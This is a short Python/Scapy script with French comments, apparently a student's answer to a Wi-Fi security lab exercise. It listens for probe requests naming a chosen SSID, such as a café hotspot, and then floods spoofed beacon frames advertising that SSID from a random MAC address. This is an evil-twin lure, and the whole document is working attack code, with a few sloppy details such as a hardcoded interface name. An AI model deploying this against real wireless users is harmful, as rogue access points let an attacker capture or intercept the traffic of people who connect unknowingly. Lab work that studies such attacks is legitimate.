#!/usr/bin/env python
from scapy.all import *
from faker import Faker
import argparse

# Outil découvert pour le parsing d'arguments en python https://docs.python.org/3/library/argparse.html
# Outil découvert pour la génération d'adresse MAC et SSID aléatoire https://faker.readthedocs.io/en/master/providers/faker.providers.internet.html?highlight=mac%20address#faker.providers.internet.Provider.mac_address

parser = argparse.ArgumentParser()
parser.add_argument("-i", required=True) # Interface
parser.add_argument("-s", required=True) # SSID cible
args = parser.parse_args()


# Développer un script en Python/Scapy capable de detecter une STA cherchant un SSID particulier - proposer un evil twin si le SSID est trouvé (i.e. McDonalds, Starbucks, etc.).
# Pour la détection du SSID, vous devez utiliser Scapy. Pour proposer un evil twin, vous pouvez très probablement réutiliser du code des exercices précédents ou vous servir d'un outil existant.


# Fonction appelée sur chaque paquet sniffé
def pkt_handler(pkt):
    # Si le paquet est une probe request
    if pkt.haslayer(Dot11ProbeReq):
        print("Probe request détectée !")
        print("SSID : ", pkt.info.decode())
        # Si le packet contient le SSID cible
        if pkt.info.decode() == args.s:
            print("Probe request pour le SSID cible détectée !")
            print("SSID cible : ", pkt.info.decode())
            # Attaque Evil Twin
            print("Attaque Evil Twin en cours...")
            evil_twin()

# Fonction qui envoie un beacon avec le SSID cible
def evil_twin():
    random_mac = Faker().mac_address()
    packet = RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=random_mac, addr3=random_mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info=args.s, len=len(args.s))
    sendp(packet, iface=args.i, inter=0.1, loop=1)

    sendp(packet, iface='wlan0mon', inter=0.1, verbose=1)

def main():

    # Snif les paquets pour détecter les AP
    print("Sniffing en cours...")
    sniff(count = 10000, timeout=5, iface="wlan0mon", prn = pkt_handler)

    print("Fin du sniffing")

if __name__ == "__main__":
    main()
